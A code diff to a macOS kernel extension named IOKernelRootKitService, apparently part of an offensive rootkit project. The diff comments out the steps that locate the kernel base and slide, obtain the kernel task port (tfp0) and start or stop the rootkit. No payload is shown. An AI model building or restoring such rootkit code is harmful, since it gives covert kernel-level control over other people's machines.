@@ -10,18 +10,16 @@
 
 #include "Log.hpp"
 
-#define super IOService
-
 OSDefineMetaClassAndStructors(IOKernelRootKitService, IOService)
 
 bool IOKernelRootKitService::init(OSDictionary *properties)
 {
-	userClients = OSSet::withCapacity(1);
+	this->userClients = OSSet::withCapacity(1);
 
-	if(!userClients)
+	if(!this->userClients)
 		return false;
 
-	return super::init(properties);
+	return IOService::init(properties);
 }
 
 void IOKernelRootKitService::free()
@@ -33,12 +31,25 @@ bool IOKernelRootKitService::start(IOService *provider)
 {
 	kern_return_t ret = kIOReturnSuccess;
 
-	mach_vm_address_t kernel_base = Kernel::findKernelBase();
+	mach_vm_address_t kernel_base = 0;// Kernel::findKernelBase();
 
-	MAC_RK_LOG("MacRK::START KERNEL EXTENSION!\n");
+	off_t kernel_slide = 0;// Kernel::findKernelSlide();
 
-	off_t kernel_slide = Kernel::findKernelSlide();
+	char buffer[128];
 
+	// MAC_RK_LOG("MacRK::IOKernelRootKitService::start()!\n");
+
+	/*
+	snprintf(buffer, 128, "0x%llx", kernel_base);
+
+	MAC_RK_LOG("MacRK::IOKernelRootKitService::kernel_base = %s\n", buffer);
+
+	snprintf(buffer, 128, "0x%llx", kernel_slide);
+
+	MAC_RK_LOG("MacRK::IOKernelRootKitService::kernel_slide = %s\n", buffer);
+	*/
+
+	/*
 	this->kernel = new Kernel(kernel_base, kernel_slide);
 
 	this->kernel->setRootKitService(this);
@@ -46,13 +57,14 @@ bool IOKernelRootKitService::start(IOService *provider)
 	this->tfp0 = this->kernel->getKernelTaskPort();
 
 	ret = mac_rootkit_start(this, this->kernel, &this->rootkitKext);
+	*/
 
 	if(ret == kIOReturnSuccess)
 	{
-		this->rootkit = mac_rootkit_get_rootkit();
-
-		registerService();
+		//this->rootkit = mac_rootkit_get_rootkit();
 	}
+
+	// registerService();
 
 	return ret == kIOReturnSuccess && IOService::start(provider);
 }
@@ -61,6 +73,7 @@ void IOKernelRootKitService::stop(IOService *provider)
 {
 	kern_return_t ret;
 
+	/*
 	ret = mac_rootkit_stop(this, this->kernel, &this->rootkitKext);
 
 	if(ret != KERN_SUCCESS)
@@ -72,6 +85,7 @@ void IOKernelRootKitService::stop(IOService *provider)
 	{
 		this->detachUserClients();
 	}
+	*/
 
 	IOService::stop(provider);
 }
